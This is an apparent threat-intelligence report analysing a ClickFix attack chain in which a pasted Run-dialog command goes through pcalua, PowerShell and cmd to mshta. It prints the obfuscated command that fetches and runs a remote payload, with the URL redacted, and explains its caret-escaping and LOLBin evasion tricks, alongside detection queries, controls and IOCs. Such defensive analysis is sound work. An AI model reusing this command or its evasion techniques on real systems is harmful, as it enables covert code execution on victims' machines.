# TTP Extraction — ClickFix → pcalua → PowerShell → cmd → mshta

**Date observed:** 2026-08-19
**Source:** CrowdStrike Falcon detection (endpoint), community report
**Verdict:** Authorised red team / pentest activity (attribution confirmed post-triage)
**Confidence:** High on chain reconstruction, Medium on intent classification prior to attribution
**TLP:** CLEAR

---

## 1. Observed command

```
pcalua -a "PowerShell" -c "saps cmd '/v/c m^s^h^t^a h^t^t^p^s^:^/^/[REDACTED]' -Wi Hi"
```

Entered by a user into the **Windows Run dialog (Win+R)** after copy/paste — classic ClickFix
social-engineering delivery.

### Deobfuscated equivalent

```
mshta https://[REDACTED]
```

### Execution chain

```
explorer.exe            ← Run dialog host (paste + Enter)
  └─ pcalua.exe         ← Program Compatibility Assistant, used as a launcher proxy
       └─ powershell.exe
            └─ cmd.exe  ← launched hidden via Start-Process -WindowStyle Hidden
                 └─ mshta.exe https://[REDACTED]
                      └─ remote HTA / script payload
```

---

## 2. Component-by-component breakdown

| Fragment | Meaning | Purpose to the operator |
|---|---|---|
| `pcalua -a <app> -c <args>` | Program Compatibility Assistant launcher. `-a` = application, `-c` = command line | LOLBin proxy. Breaks the `explorer.exe → powershell.exe` parent/child pair that most naive detections key on |
| `saps` | Alias for `Start-Process` | Short, less-signatured alias; avoids the literal string `Start-Process` |
| `-Wi Hi` | Truncated `-WindowStyle Hidden` | No visible console; user sees nothing after pressing Enter. PowerShell accepts unambiguous parameter prefixes |
| `cmd /v` | Enable delayed environment variable expansion | Enables `!var!` expansion; also commonly present purely to break command-line signatures |
| `cmd /c` | Run command, then terminate | Fire-and-forget |
| `m^s^h^t^a` | Caret escape obfuscation | `cmd.exe` strips `^` during parsing → resolves to `mshta`. Defeats literal string matching on the binary name |
| `h^t^t^p^s^:^/^/` | Caret escape on the scheme | Defeats URL/protocol string matching and many naive regex-based command-line detections |
| `mshta <url>` | Microsoft HTML Application host | Signed Microsoft binary retrieves and executes remote HTA/VBScript/JScript in-memory. No file written to disk by the operator |

**Key point:** every binary in the chain is Microsoft-signed and present by default. Nothing is
dropped to disk prior to `mshta` fetching the payload.

---

## 3. MITRE ATT&CK mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Drive-by Compromise | T1189 | Assumed ClickFix lure page (fake CAPTCHA / "fix your browser" prompt) — typical delivery for this pattern |
| Initial Access | Phishing: Spearphishing Link | T1566.002 | Alternate delivery path for the same lure |
| Execution | User Execution: Malicious Copy and Paste | **T1204.004** | RunMRU write + Win+R paste — the defining ClickFix artefact |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe` invoked with `saps` |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | `cmd.exe /v /c` |
| Defense Evasion | Indirect Command Execution | **T1202** | `pcalua.exe` used as launch proxy |
| Defense Evasion | System Binary Proxy Execution: Mshta | **T1218.005** | `mshta.exe` executing remote content |
| Defense Evasion | Obfuscated Files or Information: Command Obfuscation | **T1027.010** | Caret escaping on `mshta` and `https://` |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | `cmd.exe` parser performs the caret stripping at runtime |
| Defense Evasion | Hide Artifacts: Hidden Window | **T1564.003** | `-WindowStyle Hidden` |
| Command and Control | Ingress Tool Transfer | T1105 | Remote payload retrieved by `mshta` |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS retrieval |

Not observed in this sample (would be the natural next stage): persistence, credential access,
discovery, and any post-HTA payload behaviour.

---

## 4. Detection artefacts

### Registry
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` — values `a`–`z` plus `MRUList`.
  Records the literal string typed/pasted into the Run dialog. This is the highest-fidelity
  ClickFix artefact and it survives the process tree. Values are ROT-free plaintext with a
  trailing `\1`.
- Corroborate with `HKCU\...\Explorer\TypedPaths` and `UserAssist` for user context.

### Process telemetry
- Parent `explorer.exe` → child `pcalua.exe` (rare in normal use; PCA normally launches installers)
- `pcalua.exe` with `-a` pointing at a script interpreter (`powershell`, `cmd`, `wscript`, `cscript`, `mshta`, `rundll32`)
- Any command line containing `^` inside a `cmd.exe` invocation
- `powershell.exe` command line containing `saps`, `-Wi`, `-W Hi`, `WindowStyle Hidden`
- `mshta.exe` with an argument beginning `http`/`https` — mshta making an outbound connection at all is anomalous in most estates

### Network / file
- `mshta.exe` as the process owner of an outbound TLS connection
- Cached HTA under `%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\`
- WinINet cache/history entries attributed to `mshta.exe`

### Timeline pivot
Lure page in browser history → RunMRU write → `pcalua.exe` process creation, typically all inside
30–90 seconds. That tight window is itself a strong signal.

---

## 5. Hunting queries

> Validate field names against your own schema/platform version before deploying.

**CrowdStrike Falcon — Event Search (legacy, Splunk syntax)**

```
event_simpleName=ProcessRollup2 FileName=pcalua.exe
| search CommandLine="*-a*"
| eval chain=ParentBaseFileName."->".FileName
| table _time ComputerName UserName ParentBaseFileName FileName CommandLine
```

```
event_simpleName=ProcessRollup2 FileName=mshta.exe CommandLine="*http*"
| table _time ComputerName UserName ParentBaseFileName CommandLine
```

**Falcon LogScale / NG-SIEM (CQL)**

```
#event_simpleName=ProcessRollup2
| in(field="FileName", values=["pcalua.exe","mshta.exe"])
| CommandLine=/(\^|http)/i
| groupBy([aid, ComputerName, UserName], function=collect([ParentBaseFileName, FileName, CommandLine]))
```

**Caret obfuscation, any parent**

```
#event_simpleName=ProcessRollup2 FileName=cmd.exe
| CommandLine=/\^[a-z]\^[a-z]/i
```

**Windows Event Log / Sysmon equivalent**
- Sysmon EID 1 (process create) — the process-tree rules above
- Sysmon EID 13 (registry value set) — `TargetObject` contains `\Explorer\RunMRU\`
- Sysmon EID 3 / 22 — `mshta.exe` network connection or DNS query
- Security 4688 with command-line auditing enabled (`Include command line in process creation events`)
- PowerShell 4104 (script block logging) — will capture the `saps` line

See `detections/sigma_clickfix_pcalua_mshta.yml` for portable Sigma rules.

---

## 6. Would endpoint controls have prevented this?

Ranked by how far left of the EDR detection they act.

| Control | Effect on this chain | Notes |
|---|---|---|
| **WDAC / AppLocker deny rules** on `mshta.exe`, `pcalua.exe`, `hh.exe`, `wscript.exe`, `cscript.exe` | **Prevents.** Kills the chain at the LOLBin | The single highest-value control here. Audit mode first — `mshta` still has legacy internal-app users in some estates, `pcalua` almost never does |
| **Disable the Run dialog** (GPO/Intune: `NoRun`, User Config → Admin Templates → Start Menu and Taskbar → Remove Run menu) | **Prevents this delivery path.** Does not stop the same command arriving via other vectors | Cheap, low breakage in most managed fleets. Attackers pivot to the Windows Terminal / PowerShell prompt variant of ClickFix, so pair it with the LOLBin block |
| **Remove the `.hta` file association** / repoint `htafile` to `notepad.exe` | Blocks double-click HTA; does **not** block direct `mshta.exe <url>` invocation | Partial only. Not a substitute for blocking the binary |
| **Defender ASR rules** | Partial. No rule blocks `mshta` directly. "Block JavaScript/VBScript from launching downloaded executable content" and "Block executable content from email/webmail" hit the *next* stage, not this one | Useful depth, not the answer to this chain |
| **PowerShell Constrained Language Mode** (enforced via WDAC) | Blocks much of what a follow-on payload would do; `Start-Process` itself still runs | Depth control |
| **Egress filtering / TLS inspection / DNS filtering** | Prevents payload retrieval if the C2 domain is uncategorised or newly registered | Catches the chain at C2 rather than execution |
| **EDR (Falcon) detection + block** | **Detected here**, at `pcalua → powershell → cmd → mshta` and on the RunMRU write | Behavioural — it fires after execution has started. Fine as a net, poor as the only layer |
| **User training on ClickFix** | Prevents the paste | Genuinely effective for this technique specifically, because the user action is so unusual — "paste this into Win+R" is never legitimate |

**Short answer:** without WDAC/AppLocker blocking `mshta.exe`, this chain executes and you are
relying entirely on EDR to catch it in flight. Falcon did catch it here — both the copy/paste
behaviour and the LOLBin chain — but detection-after-execution means the HTA has already been
fetched and run in memory.

**On blocking `mshta.exe` outright:** it is a reasonable default in a modern managed Windows
estate. HTAs are a deprecated technology with essentially no modern legitimate use. Run it in
audit mode for two to four weeks first — the usual hits are ancient line-of-business web apps,
some vendor installers, and a few help systems. Block `pcalua.exe` at the same time; it has even
less legitimate call in a managed fleet, and it is the part of this chain that most estates have
never even considered.

---

## 7. Recommended actions

1. Deploy WDAC/AppLocker deny rules for `mshta.exe` and `pcalua.exe` — audit first, then enforce.
2. Enable GPO `NoRun` where the fleet's support model allows it.
3. Hunt retrospectively across 90 days for RunMRU values containing `powershell`, `mshta`,
   `curl`, `msiexec`, `conhost`, `\1` + base64 blobs, or caret sequences.
4. Confirm command-line process auditing and PowerShell script block logging are on estate-wide —
   without them the caret obfuscation is invisible in Windows logs.
5. Add the Sigma rules in `detections/` to the SIEM and confirm they fire against the pentest's
   own telemetry (free true-positive validation data — use it before the engagement report closes).
6. Ask the red team for the full payload chain past `mshta` and map the follow-on TTPs too; this
   extraction covers only the delivery and execution stages.

---

## 8. IOCs

| Type | Value | Note |
|---|---|---|
| URL | `https://[REDACTED]` | Redacted in source report — request from the red team for blocklisting and retro-hunt |
| Command line | `pcalua -a "PowerShell" -c "saps cmd '/v/c m^s^h^t^a h^t^t^p^s^:^/^/...' -Wi Hi"` | Exact string; treat the *pattern* as the durable indicator, not the literal |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` | Contains the pasted string verbatim |

Behavioural indicators outlive the atomic ones here — the caret-obfuscation-into-LOLBin pattern is
reusable, the URL is not.
